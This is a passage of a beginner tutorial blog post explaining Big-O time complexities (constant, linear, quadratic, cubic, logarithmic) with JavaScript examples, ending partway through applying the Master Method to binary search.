<p>We use the Big-O notation to classify algorithms based on their running time or space (memory used) as the input grows. The <code>O</code> function is the growth rate in function of the input size <code>n</code>.</p>
<p>Before we dive in, here is the <strong>big O cheatsheet</strong> and examples that we are going to cover on this post. <strong>Click</strong> on them to go to the implementation. üòâ</p>
<!--
Big O Notation | Name | Example(s)
<i>O(1)</i>| Constant | # [Odd or Even number](#odd-or-even) # [Look-up table](#Look-up-table)
<i>O(log n)</i>| Logarithmic | # [Finding element on sorted array with **binary search**](#Binary-search)
<i>O(n)</i>| Linear | # [Find max element in unsorted array](#Largest-item-on-an-unsorted-array)
<i>O(n log n)</i>| Linearithmic,  | # [Sorting elements in array with **merge sort**](#Mergesort)
<i>O(n<sup>2</sup>)</i>| Quadratic | # [Duplicate elements in array](#Has-duplicates), # [Sorting array with **bubble sort**](#Bubble-sort)
<i>O(n<sup>3</sup>)</i>| Cubic | # [3 variables equation solver](#Triple-nested-loops)
<i>O(2<sup>n</sup>)</i>| Exponential | # [Find all subsets](#Subsets-of-a-Set)
<i>O(n!)</i>| Factorial | # [Find all permutations of a given set/string](#Permutations)
-->
<table>
<thead>
<tr>
<th>Big O Notation</th>
<th>Name</th>
<th>Example(s)</th>
</tr>
</thead>
<tbody>
<tr>
<td class="green"><i>O(1)</i></td>
<td class="green">Constant</td>
<td># <a href="#odd-or-even">Odd or Even number</a>,<br># <a href="#Look-up-table">Look-up table (on average)</a></td>
</tr>
<tr>
<td class="green"><i>O(log n)</i></td>
<td class="green">Logarithmic</td>
<td># <a href="#Binary-search">Finding element on sorted array with <strong>binary search</strong></a></td>
</tr>
<tr>
<td class="green"><i>O(n)</i></td>
<td class="green">Linear</td>
<td># <a href="#Largest-item-on-an-unsorted-array">Find max element in unsorted array</a>,<br># <a href="#">Duplicate elements in array with Hash Map</a></td>
</tr>
<tr>
<td class="green"><i>O(n log n)</i></td>
<td class="green">Linearithmic</td>
<td># <a href="#Mergesort">Sorting elements in array with <strong>merge sort</strong></a></td>
</tr>
<tr>
<td class="orange"><i>O(n<sup>2</sup>)</i></td>
<td class="orange">Quadratic</td>
<td># <a href="#Has-duplicates">Duplicate elements in array <strong>(na√Øve)</strong></a>,<br># <a href="#Bubble-sort">Sorting array with <strong>bubble sort</strong></a></td>
</tr>
<tr>
<td class="orange"><i>O(n<sup>3</sup>)</i></td>
<td class="orange">Cubic</td>
<td># <a href="#Triple-nested-loops">3 variables equation solver</a></td>
</tr>
<tr>
<td class="red"><i>O(2<sup>n</sup>)</i></td>
<td class="red">Exponential</td>
<td># <a href="#Subsets-of-a-Set">Find all subsets</a></td>
</tr>
<tr>
<td class="red"><i>O(n!)</i></td>
<td class="red">Factorial</td>
<td># <a href="#Permutations">Find all permutations of a given set/string</a></td>
</tr>
</tbody>
</table>

<p>Now, Let‚Äôs go one by one and provide code examples!</p>
<hr>
<p>This post is part of a tutorial series:</p>
<p><strong>Learning Data Structures and Algorithms (DSA) for Beginners</strong></p>
<ol>
<li><p><a href="/blog/2018/04/04/how-you-can-change-the-world-learning-data-structures-algorithms-free-online-course-tutorial/">Intro to algorithm‚Äôs time complexity and Big O notation</a></p>
<!-- 1. Intro to Algorithm's Time Complexity and Big O Notation **üëà you are here** -->
</li>
<li><p>Eight time complexities that every programmer should know <strong>üëà you are here</strong></p>
<!-- 1. [Eight time complexities that every programmer should know](/blog/2018/04/05/most-popular-algorithms-time-complexity-every-programmer-should-know-free-online-tutorial-course/) -->
</li>
<li><p><a href="/blog/2018/04/28/Data-Structures-Time-Complexity-for-Beginners-Arrays-HashMaps-Linked-Lists-Stacks-Queues-tutorial/">Data Structures for Beginners: Arrays, HashMaps, and Lists</a></p>
<!-- 1. Data Structures for Beginners: Arrays, HashMaps, and Lists **üëà you are here** -->
</li>
<li><p><a href="/blog/2018/05/14/Data-Structures-for-Beginners-Graphs-Time-Complexity-tutorial/">Graph Data Structures for Beginners</a></p>
<!-- 1. Graph Data Structures for Beginners **üëà you are here** -->
</li>
<li><p><a href="/blog/2018/06/11/Data-Structures-for-Beginners-Trees-binary-search-tree-tutorial/">Trees Data Structures for Beginners</a></p>
<!-- 1. Trees Data Structures for Beginners **üëà you are here** -->
</li>
<li><p><a href="/blog/2018/07/16/self-balanced-binary-search-trees-with-avl-tree-data-structure-for-beginners/">Self-balanced Binary Search Trees</a></p>
<!-- 1. Self-balanced Binary Search Trees  **üëà you are here** -->
</li>
<li><p><a href="/blog/2018/04/24/Analysis-of-Recursive-Algorithms/">Appendix I: Analysis of Recursive Algorithms</a></p>
<!-- 1. Appendix I: Analysis of Recursive Algorithms **üëà you are here** -->
</li>
</ol>
<hr>
<!-- table: time complexities -->
<h1 id="O-1-Constant-time">O(1) - Constant time<a href="#O-1-Constant-time" class="headerlink" title="O(1) - Constant time"></a></h1><p><code>O(1)</code> describes algorithms that takes the same amount of time to compute regardless of the input size.</p>
<p>For instance, if a function takes the identical time to process 10 elements as well as 1 million items, then we say that it has a constant growth rate or <code>O(1)</code>. Let‚Äôs see some cases.</p>
<h2 id="Odd-or-Even">Odd or Even<a href="#Odd-or-Even" class="headerlink" title="Odd or Even"></a></h2><p>  Find if a number is odd or even.</p>
  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isEvenOrOdd</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> n % <span class="number">2</span> ? <span class="string">'Odd'</span> : <span class="string">'Even'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(isEvenOrOdd(<span class="number">10</span>)); <span class="comment">// =&gt; Even</span></span><br><span class="line"><span class="built_in">console</span>.log(isEvenOrOdd(<span class="number">10001</span>)); <span class="comment">// =&gt; Odd</span></span><br></pre></td></tr></table></figure>
<p>  <strong>Advanced note:</strong> you could also replace <em><code>n % 2</code></em> with the bit AND operator: <em><code>n &amp; 1</code></em>. If the first bit (<abbr title="Least Significant Bit">LSB</abbr>) is <code>1</code> then is odd otherwise is even.</p>
<p> It doesn‚Äôt matter if n is <code>10</code> or <code>10,001</code>, it will execute line 2 only one time.</p>
<blockquote>
<p>Do not be fool by one-liners. They don‚Äôt always translate to constant times. You have to be aware of how they are implemented.</p>
</blockquote>
<p>If you have a method like <code>Array.sort()</code> or any other array or object methods you have to look into the implementation to determine its running time.</p>
<p>Primitive operations like sum, multiplication, subtraction, division, modulo, bit shift, etc have a constant runtime. This can be shocking!</p>
<p>If you use the schoolbook long multiplication algorithm, it would take <code>O(n<sup>2</sup>)</code> to multiply two numbers. However, most programming languages limit numbers to max value (e.g. in JS: <code>Number.MAX_VALUE</code> is <code>1.7976931348623157e+308</code>). So, you cannot operate numbers that yield a result greater than the <code>MAX_VALUE</code>. So, primitive operations are bound to be completed on a fixed amount of instructions <code>O(1)</code> or throw overflow errors (in JS, <code>Infinity</code> keyword).</p>
<!-- Addition O(n), Multiplication O(n^2) https://en.wikipedia.org/wiki/Computational_complexity_of_mathematical_operations -->
<p> This example was easy. Let‚Äôs do another one.</p>
<h2 id="Look-up-table">Look-up table<a href="#Look-up-table" class="headerlink" title="Look-up table"></a></h2><p>Given a string find its word frequency data.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> dictionary = &#123;<span class="attr">the</span>: <span class="number">22038615</span>, <span class="attr">be</span>: <span class="number">12545825</span>, <span class="attr">and</span>: <span class="number">10741073</span>, <span class="attr">of</span>: <span class="number">10343885</span>, <span class="attr">a</span>: <span class="number">10144200</span>, <span class="attr">in</span>: <span class="number">6996437</span>, <span class="attr">to</span>: <span class="number">6332195</span> <span class="comment">/* ... */</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getWordFrequency</span>(<span class="params">dictionary, word</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> dictionary[word];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(getWordFrequency(dictionary, <span class="string">'the'</span>));</span><br><span class="line"><span class="built_in">console</span>.log(getWordFrequency(dictionary, <span class="string">'in'</span>));</span><br></pre></td></tr></table></figure>
<p>Again, we can be sure that even if the dictionary has 10 or 1 million words, it would still execute line 4 once to find the word. However, if we decided to store the dictionary as an array rather than a hash map, then it would be a different story. In the next section, we are going to explore what‚Äôs the running time to find an item in an array.</p>
<blockquote>
<p>Only a hash table with a perfect <em>hash function</em> will have a worst-case runtime of <em>O(1)</em>. The perfect hash function is not practical, so there will be some collisions and workarounds leads to a worst-case runtime of <em>O(n)</em>. Still, on <em>average</em> the lookup time is <em>O(1)</em>.</p>
</blockquote>
<h1 id="O-n-Linear-time">O(n) - Linear time<a href="#O-n-Linear-time" class="headerlink" title="O(n) - Linear time"></a></h1><p>Linear running time algorithms are very common. It implies visiting every element from the input in the worst-case scenario.</p>
<p>Linear time complexity <em><code>O(n)</code></em> means that as the input grows, the algorithms take proportionally longer. A function with a linear time complexity has a growth rate. Some examples:</p>
<h2 id="The-largest-item-on-an-unsorted-array">The largest item on an unsorted array<a href="#The-largest-item-on-an-unsorted-array" class="headerlink" title="The largest item on an unsorted array"></a></h2><p>Let‚Äôs say you want to find the maximum value from an unsorted array.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">findMax</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> max;</span><br><span class="line">  <span class="keyword">let</span> counter = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; n.length; i++) &#123;</span><br><span class="line">    counter++;</span><br><span class="line">    <span class="keyword">if</span>(max === <span class="literal">undefined</span> || max &lt; n[i]) &#123;</span><br><span class="line">      max = n[i];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`n: <span class="subst">$&#123;n.length&#125;</span>, counter: <span class="subst">$&#123;counter&#125;</span>`</span>);</span><br><span class="line">  <span class="keyword">return</span> max;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>How many operations will the <code>findMax</code> function do?</p>
<p>Well, it checks every element from <code>n</code>. If the current element is bigger than <code>max</code> it will do an assignment.</p>
<p>Notice that we added a counter so it can help us count how many times the inner block is executed.</p>
<p>If you get the time complexity it would be something like this:</p>
<ul>
<li>Line 2-3: 2 operations</li>
<li>Line 4: a loop of size n</li>
<li>Line 6-8: 3 operations inside the for-loop.</li>
</ul>
<p>So, this gets us <code>3(n) + 2</code>.</p>
<p>Applying the asymptotic analysis that we learn in the previous post, we can only leave the most significant term, thus: <code>n</code>.  And finally using the Big O notation we get: <code>O(n)</code>.</p>
<p>We can verify this using our <code>counter</code>. If <code>n</code> has 3 elements:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">findMax([<span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>]);</span><br><span class="line"><span class="comment">// n: 3, counter: 3</span></span><br></pre></td></tr></table></figure>
<p>or if <code>n</code> has 9 elements:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">findMax([<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">7</span>])</span><br><span class="line"><span class="comment">// n: 9, counter: 9</span></span><br></pre></td></tr></table></figure>
<p>Now imagine that you have an array of one million items. Do you think it will take the same time? Of course not, it will take longer to the size of the input. If we plot it n and <code>findMax</code> running time we will have a graph like a linear equation.</p>
<img src="/images/linear-running-time-o(n).jpg" title="Linear Running time O(n) example">
<h1 id="O-n-2-Quadratic-time">O(n^2) - Quadratic time<a href="#O-n-2-Quadratic-time" class="headerlink" title="O(n^2) - Quadratic time"></a></h1><p>A function with a quadratic time complexity has a growth rate n^2. If the input is size 2, it will do 4 operations. If the input is size 8, it will take 64, and so on. Here are some code examples of quadratic algorithms:</p>
<h2 id="Has-duplicates">Has duplicates<a href="#Has-duplicates" class="headerlink" title="Has duplicates"></a></h2><p>You want to find duplicate words in an array. A na√Øve solution will be the following:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hasDuplicates</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> dupliates = [];</span><br><span class="line">  <span class="keyword">let</span> counter = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> outter = <span class="number">0</span>; outter &lt; n.length; outter++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> inner = <span class="number">0</span>; inner &lt; n.length; inner++) &#123;</span><br><span class="line">      counter++;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(outter === inner) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(n[outter] === n[inner]) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`n: <span class="subst">$&#123;n.length&#125;</span>, counter: <span class="subst">$&#123;counter&#125;</span>`</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Time complexity analysis:</p>
<ul>
<li>Line 2-3: 2 operations</li>
<li>Line 5-6: double-loop of size n, so <code>n^2</code>.</li>
<li>Line 7-13: has ~3 operations inside the double-</li>
</ul>
<p>We get <code>3n^2 + 2</code>.</p>
<p>Again, when we have an asymptotic analysis, we drop all constants and leave the most significant term: <code>n^2</code>. So, in big O notation, it would be <code>O(n^2)</code>.</p>
<p>We are using a counter variable to help us verify. The <code>hasDupliates</code> function has two loops. If we have an input of 4 words, it will execute the inner block 16 times. If we have 9, it will perform counter 81 times and so forth.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hasDuplicates([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]);</span><br><span class="line"><span class="comment">// n: 4, counter: 16</span></span><br></pre></td></tr></table></figure>
<p>and with n size 9:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hasDuplicates([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]);</span><br><span class="line"><span class="comment">// n: 9, counter: 81</span></span><br></pre></td></tr></table></figure>
<p>Let‚Äôs see another example.</p>
<h2 id="Bubble-sort">Bubble sort<a href="#Bubble-sort" class="headerlink" title="Bubble sort"></a></h2><p>We want to sort the elements in an array.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sort</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> outer = <span class="number">0</span>; outer &lt; n.length; outer++) &#123;</span><br><span class="line">    <span class="keyword">let</span> outerElement = n[outer];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> inner = outer + <span class="number">1</span>; inner &lt; n.length; inner++) &#123;</span><br><span class="line">      <span class="keyword">let</span> innerElement = n[inner];</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(outerElement &gt; innerElement) &#123;</span><br><span class="line">        <span class="comment">// swap</span></span><br><span class="line">        n[outer] = innerElement;</span><br><span class="line">        n[inner] = outerElement;</span><br><span class="line">        <span class="comment">// update references</span></span><br><span class="line">        outerElement = n[outer];</span><br><span class="line">        innerElement = n[inner];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Also, you might notice that for a colossal <code>n</code>, the time it takes to solve the problem increases a lot. Can you spot the relationship between nested loops and the running time? When a function has a single loop, it usually translates to a running time complexity of O(n). Now, this function has 2 nested loops and quadratic running time: O(n^2).</p>
<!--

As you can probably guess, two inner loops translate to O(n^2) since it has to go through the array twice in most cases.

Usually, we want to stay away from polynomial running times (quadratic, cubic, O(n^c) ‚Ä¶) since they take longer to compute as the input grows fast. However, they are not the worst. Let's something that takes even longer.

## Quick sort
---

Expand:
  * worst case: reverse order
  * best case: already ordered

---
-->
<h1 id="O-n-c-Polynomial-time">O(n^c) - Polynomial time<a href="#O-n-c-Polynomial-time" class="headerlink" title="O(n^c) - Polynomial time"></a></h1><p>Polynomial running is represented as O(n^c), when c &gt; 1. As you already saw, two inner loops almost translate to O(n^2) since it has to go through the array twice in most cases. Are three nested loops cubic? In most cases, yes!</p>
<p>Usually, we want to stay away from polynomial running times (quadratic, cubic, O(n^c) ‚Ä¶) since they take longer to compute as the input grows fast. However, they are not the worst. Let‚Äôs something that it‚Äôs even slower.</p>
<h2 id="Triple-nested-loops">Triple nested loops<a href="#Triple-nested-loops" class="headerlink" title="Triple nested loops"></a></h2><p>Let‚Äôs say you want to find the solutions for a multi-variable equation that looks like this:</p>
<blockquote>
<p>3x + 9y + 8z = 79</p>
</blockquote>
<p>This naive program will give you all the solutions that satisfy the equation where <code>x</code>, <code>y</code> and <code>z</code> &lt; <code>n</code>.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">findXYZ</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> solutions = [];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> x = <span class="number">0</span>; x &lt; n; x++) &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> y = <span class="number">0</span>; y &lt; n; y++) &#123;</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">let</span> z = <span class="number">0</span>; z &lt; n; z++) &#123;</span><br><span class="line">        <span class="keyword">if</span>( <span class="number">3</span>*x + <span class="number">9</span>*y + <span class="number">8</span>*z === <span class="number">79</span> ) &#123;</span><br><span class="line">          solutions.push(&#123;x, y, z&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> solutions;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(findXYZ(<span class="number">10</span>)); <span class="comment">// =&gt; [&#123;x: 0, y: 7, z: 2&#125;, ...]</span></span><br></pre></td></tr></table></figure>
<p>This algorithm has a cubic running time: <code>O(n^3)</code>.</p>
<p><strong>Note:</strong> We could do a more efficient solution but for the purpose of showing an example of a cubic runtime is good enough.</p>
<h1 id="O-log-n-Logarithmic-time">O(log n) - Logarithmic time<a href="#O-log-n-Logarithmic-time" class="headerlink" title="O(log n) - Logarithmic time"></a></h1><p>Logarithmic time complexities usually apply to algorithms that divide problems in half every time. For instance, let‚Äôs say that we want to look for a person in an old phone book. It has every name sorted alphabetically. There are at least two ways to do it:</p>
<p>Algorithm A:</p>
<ul>
<li>Start at the beginning of the book and go in order until you find the contact you are looking for. Run-time: <code>O(n)</code></li>
</ul>
<p>Algorithm B:</p>
<ul>
<li>Open the book in the middle and check the first name on it.</li>
<li>If the name that you are looking for is alphabetically bigger, then look to the right. Otherwise, look in the left half.</li>
</ul>
<h2 id="Binary-search">Binary search<a href="#Binary-search" class="headerlink" title="Binary search"></a></h2><p>Find the index of an element in a sorted array.</p>
<p>If we implement (Algorithm A) going through all the elements in an array, it will take a running time of <code>O(n)</code>. Can we do better? We can try using the fact that the collection is already sorted. Later, we can divide in half as we look for the element in question.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">indexOf</span>(<span class="params">array, element, offset = <span class="number">0</span></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// split array in half</span></span><br><span class="line marked">  <span class="keyword">const</span> half = <span class="built_in">parseInt</span>(array.length / <span class="number">2</span>);</span><br><span class="line marked">  <span class="keyword">const</span> current = array[half];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(current === element) &#123;</span><br><span class="line">    <span class="keyword">return</span> offset + half;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(element &gt; current) &#123;</span><br><span class="line">    <span class="keyword">const</span> right = array.slice(half);</span><br><span class="line marked">    <span class="keyword">return</span> indexOf(right, element, offset + half);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> left = array.slice(<span class="number">0</span>, half)</span><br><span class="line marked">    <span class="keyword">return</span> indexOf(left, element, offset);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> directory = [<span class="string">"Adrian"</span>, <span class="string">"Bella"</span>, <span class="string">"Charlotte"</span>, <span class="string">"Daniel"</span>, <span class="string">"Emma"</span>, <span class="string">"Hanna"</span>, <span class="string">"Isabella"</span>, <span class="string">"Jayden"</span>, <span class="string">"Kaylee"</span>, <span class="string">"Luke"</span>, <span class="string">"Mia"</span>, <span class="string">"Nora"</span>, <span class="string">"Olivia"</span>, <span class="string">"Paisley"</span>, <span class="string">"Riley"</span>, <span class="string">"Thomas"</span>, <span class="string">"Wyatt"</span>, <span class="string">"Xander"</span>, <span class="string">"Zoe"</span>];</span><br><span class="line"><span class="built_in">console</span>.log(indexOf(directory, <span class="string">'Hanna'</span>));   <span class="comment">// =&gt; 5</span></span><br><span class="line"><span class="built_in">console</span>.log(indexOf(directory, <span class="string">'Adrian'</span>));  <span class="comment">// =&gt; 0</span></span><br><span class="line"><span class="built_in">console</span>.log(indexOf(directory, <span class="string">'Zoe'</span>));     <span class="comment">// =&gt; 18</span></span><br></pre></td></tr></table></figure>
<p>Calculating the time complexity of <code>indexOf</code> is not as straightforward as the previous examples. This function is recursive.</p>
<p>There are several ways to analyze recursive algorithms. For simplicity, we are going to use the <code>Master Method</code>.</p>
<h2 id="Master-Method-for-recursive-algorithms">Master Method for recursive algorithms<a href="#Master-Method-for-recursive-algorithms" class="headerlink" title="Master Method for recursive algorithms"></a></h2><p>Finding the runtime of recursive algorithms is not as easy as counting the operations. This method helps us to determine the runtime of recursive algorithms. We are going to explain this solution using the <code>indexOf</code> function as an illustration.</p>
<p>When analyzing recursive algorithms, we care about these 3 things:</p>
<ul>
<li>Runtime of the work done outside the recursion (line 3-4): <code>O(1)</code></li>
<li>How many recursive calls the problem is divided (line 11 or 14): <code>1</code> recursive call. Notice only one or the other will happen, never both.</li>
<li>How much <code>n</code> is reduced on each recursive call (line 10 or 13): <code>1/2</code>. Every recursive call cuts <code>n</code> in half.</li>
</ul>
<p>1) The Master Method formula is the following:</p>
<blockquote>
<p>T(n) = a T(n/b) + f(n)</p>
</blockquote>
<p>where:</p>
<ul>
<li><code>n</code>: size of the recursion problem. duh? :)</li>
<li><code>a</code>: the number of sub-problems. For our case, we only split the problem into another subproblem.</li>
<li><code>b</code>: the factor by which <code>n</code> is reduced. For our case, we divide <code>n</code> in half each time.</li>
<li><code>f(n)</code>: the running time outside the recursion. E.g., O(1)</li>
</ul>
<p>2) Once we know the values of <code>a</code>, <code>b</code> and <code>f(n)</code>. We can determine the runtime of the recursion using this formula:</p>
<blockquote>
<p>n<sup>log<sub>b</sub>a</sup></p>
</blockquote>
<p>This value will help us to find which mater method case we are solving.</p>
<p>3) Finally, we compare the recursion runtime from step 2) and the runtime <code>f(n)</code> from step 1). Based on that we have the following cases:</p>
<h3 id="Case-1-Most-of-the-work-done-in-the-recursion"><strong>Case 1</strong>: Most of the work done in the recursion.<a href="#Case-1-Most-of-the-work-done-in-the-recursion" class="headerlink" title="Case 1: Most of the work done in the recursion."></a></h3><p>If <code>n<sup>log<sub>b</sub>a</sup></code> &gt; <code>f(n)</code>,</p>
<p><strong>then</strong> runtime is:</p>
<blockquote>
<p><i>O(n<sup>log<sub>b</sub>a</sup>)</i></p>
</blockquote>
<h3 id="Case-2-The-runtime-of-the-work-done-in-the-recursion-and-outside-is-the-same"><strong>Case 2</strong>: The runtime of the work done in the recursion and outside is the same<a href="#Case-2-The-runtime-of-the-work-done-in-the-recursion-and-outside-is-the-same" class="headerlink" title="Case 2: The runtime of the work done in the recursion and outside is the same"></a></h3><p>If <code>n<sup>log<sub>b</sub>a</sup></code> === <code>f(n)</code>,</p>
<p><strong>then</strong> runtime is:</p>
<blockquote>
<p><i>O(n<sup>log<sub>b</sub>a</sup> log(n))</i></p>
</blockquote>
<h3 id="Case-3-Most-of-the-work-is-done-outside-the-recursion"><strong>Case 3</strong>: Most of the work is done outside the recursion<a href="#Case-3-Most-of-the-work-is-done-outside-the-recursion" class="headerlink" title="Case 3: Most of the work is done outside the recursion"></a></h3><p>If <code>n<sup>log<sub>b</sub>a</sup></code> &lt; <code>f(n)</code>,</p>
<p><strong>then</strong> runtime is:</p>
<blockquote>
<p><i>O(f(n))</i></p>
</blockquote>
<p>Now, let‚Äôs combine everything we learned here to get the running time of our binary search function <code>indexOf</code>.</p>
<h2 id="Master-Method-for-Binary-Search">Master Method for Binary Search<a href="#Master-Method-for-Binary-Search" class="headerlink" title="Master Method for Binary Search"></a></h2><p>The binary search algorithm slit <code>n</code> on half until a solution is found or array is exhausted. So, using the Master Method:</p>
<blockquote>
<p>T(n) = a T(n/b) + f(n)</p>
</blockquote>
<p>1) Find <code>a</code>, <code>b</code> and <code>f(n)</code> and replace it in the formula:</p>
<ul>
<li><code>a</code>: the number of sub-problems. For our example, we only split the problem into another subproblem. So <code>a=1</code>.</li>
<li><code>b</code>: the factor by which <code>n</code> is reduced. For our case, we divide <code>n</code> in half each time. Thus, <code>b=2</code>.</li>
<li><code>f(n)</code>: the running time outside the recursion: <code>O(1)</code>.</li>
</ul>
<p>Thus,</p>
<blockquote>
<p>T(n) = T(n/2) + O(1)</p>
</blockquote>
<p>2) Compare the runtime executed inside and outside the recursion:</p>
<ul>
<li>Runtime of the work done <strong>outside</strong> the recursion: <code>f(n)</code>. E.g. <code>O(1)</code>.</li>
<li>Runtime of work done <strong>inside</strong> the recursion given by this formula <code>n<sup>log<sub>b</sub>a</sup></code>. E.g. O(<code>n<sup>log<sub>2</sub>1<sup></sup></sup></code>) = O(<code>n<sup>0<sub></sub></sup></code>) = <code>O(1)</code>.</li>
</ul>
<p>3) Finally, getting the runtime. Based on the comparison of the expressions from the previous steps, find the case it matches.</p>
<p>As we saw in the previous step the work outside and inside the recursion has the same runtime, so we are in <strong>case 2</strong>.</p>
<blockquote>
